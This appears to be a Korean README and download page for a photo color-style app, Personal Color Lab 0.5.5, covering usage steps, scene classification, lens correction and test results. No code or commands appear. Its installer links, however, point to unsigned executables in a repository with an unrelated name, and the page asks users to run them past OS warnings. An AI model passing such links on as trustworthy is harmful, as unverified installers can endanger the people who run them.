# Personal Color Lab 0.5.5 다운로드

**RAW + JPG / RAW + XMP / 완성 JPG**에서 공통 색감과 **장면별 스타일**을 학습합니다. 낮·밤·풍경·인물·음식·사물 등21개 속성을 함께 사용하며, 자동 분류를 직접 수정할 수 있습니다. 분류 모델은 앱에 포함돼 CPU로 처리합니다. API·토큰 비용·설치 후 모델 다운로드가 필요 없습니다.

| 운영체제 | 다운로드 |
|---|---|
| Windows10/11 64비트 | [설치 파일 ZIP](https://github.com/forhide/Stone-Quotation/raw/refs/heads/personal-color-lab-downloads-v0.5.5/PersonalColorLab-0.5.5-windows-x64-download.zip) |
| macOS Apple Silicon M1/M2/M3/M4, macOS13+ | [설치 파일 ZIP](https://github.com/forhide/Stone-Quotation/raw/refs/heads/personal-color-lab-downloads-v0.5.5/PersonalColorLab-0.5.5-macos-arm64-download.zip) |
| macOS Intel, macOS14+ | [설치 파일 ZIP](https://github.com/forhide/Stone-Quotation/raw/refs/heads/personal-color-lab-downloads-v0.5.5/PersonalColorLab-0.5.5-macos-x64-download.zip) |

[소스 ZIP](https://github.com/forhide/Stone-Quotation/raw/refs/heads/personal-color-lab-downloads-v0.5.5/PersonalColorLab-0.5.5-source.zip) · [해시](https://github.com/forhide/Stone-Quotation/raw/refs/heads/personal-color-lab-downloads-v0.5.5/SHA256SUMS.txt) · [설치 안내](INSTALLERS.md) · [검증 결과](VALIDATION.md)

ZIP을 다운로드하고 압축을 풀어 Windows는 setup.exe, Mac은 해당.pkg를 실행하세요. M1 Mac은 Apple Silicon 파일을 선택합니다. 앱은 서명·Apple 공증이 없는 개발 빌드이므로 OS 확인 경고가 표시될 수 있습니다. Mac의 내장 설치 데이터 경로 수정은 유지했습니다. Mac 패키지 구조 검증은 실제 Apple Installer 실행과 구별됩니다.

## 사용 순서

1. **스타일 만들기 → 폴더 선택** 후 RAW+JPG, RAW+XMP, 완성 JPG 방식 중 하나를 선택합니다.
2. 파일을 확인하고 필요한 짝을 지정합니다. **장면 분류 수정**으로 알고 있는 낮·밤·피사체 등을 선택하거나 자동으로 둡니다.
3. 분석 후 장면별 자료 수와 각 사진의 결과를 확인합니다. 분류만 수정하면 기존 측정값을 재사용합니다.
4. 이름을 붙여 스타일을 저장하고 **스타일 적용 → 사진 선택**으로 새 RAW/JPG를 엽니다.
5. 현재 장면과 실제 적용한 장면 스타일을 확인합니다. 분류를 직접 바꾸거나 자동으로 되돌릴 수 있습니다.
6. 강도·혼합·객체 보정을 조절하고 전후 화면을 확인한 뒤 JPG 사본이나 XMP 프리셋을 저장합니다. 구도 변경은 색감만 적용이 기본값입니다.

장면별 보정은 **서로 다른 유효 원본3장 이상**부터 학습합니다. 복사본과 같은 RAW의 여러 편집본은 독립적인 원본 수로 세지 않습니다. 자료가 부족하거나 분류가 불확실하면 공통 스타일을 씁니다. 같은 원본의 서로 다른 편집은 장면 학습에서 보류하며 검토 사유를 표시합니다. 자동 분류 점수는 시각적 추정치이며 실제 촬영 시간이나 확정된 확률이 아닙니다. JPG만 사용할 때는 완성 사진의 조명·피사체·보정을 완전히 분리할 수 없습니다.

RAW 카메라·렌즈 자동 감지, 수동 선택, 검증된 프로필의 기본 왜곡 보정을 유지합니다. Sony A7CR 본체는 인식하지만 내장 공식 데이터에는 FE16–35mmF2.8GMII 보정치가 없어 GM I을 대신 사용하지 않습니다. XMP는 전역 색감의 근사 프리셋이며 Adobe 마스크나 Lensfun 워프를 포함하지 않습니다. 하늘·지형의 픽셀 분할은 아직 지원하지 않습니다.

## 실제 앱 화면

![장면별 스타일 적용](preview/scene-style-ko.png)

![장면 분류 검토](preview/scene-review-ko.png)

![스타일 작업실](preview/style-studio-ko.png)

![객체 인식과 전후 비교](preview/recognized-person-ko.png)

![파일 검토](preview/review-ko.png)

![완성 JPG 분석](preview/reference-result-ko.png)

![RAW JPG 분석](preview/raw-jpg-result-ko.png)

![RAW XMP 분석](preview/raw-xmp-result-ko.png)

![렌즈 보정](preview/lens-correction-ko.png)

![렌즈 직접 선택](preview/lens-selection-ko.png)

![사진 라이브러리](preview/library-ko.png)

## 검증과 호환성

Linux/Xvfb 전체 테스트 **988개 통과**, 실패·오류·건너뜀0개, 경고를 오류로 처리했습니다. Windows 설치본은 Wine10에서 설치·재설치·실제 GUI·내장 모델·세 장면 학습 경로·RAW·렌즈·데이터 보존 제거를 확인했습니다. Mac은 두 아키텍처 각각9개 구조 검사 통과입니다. 실제 Windows/macOS 하드웨어 설치, Apple 서명·공증과 실제 카메라 평가는 남아 있습니다.

SQLite3은 유지합니다. 새 장면 스타일은 DNA3/엔진0.5.5이며, 이전 DNA1/2는 데이터를 수정하지 않고 기존 렌더링을 유지해 읽습니다. 이전 분석에는 새 장면 근거를 추가하려면 재분석하거나 직접 분류를 검토해야 합니다. 다운그레이드 전에 사용자 데이터 폴더를 백업하세요.

Microsoft TinyCLIP MIT, OpenCV Zoo 모델의 MIT/Apache2.0, Lensfun XML의 CC-BY-SA3.0와 런타임 라이선스를 설치 파일에 포함합니다. 사진은 업로드하거나 원본을 수정하지 않습니다. NASA 공개 이미지가 사용된 화면 외에는 합성 테스트 자료입니다. 별도 외부 검사 사진은 앱에 배포하지 않습니다. 이 브랜치는 다운로드 전달용이며 저장소 main과 이전 배포 브랜치를 유지합니다.
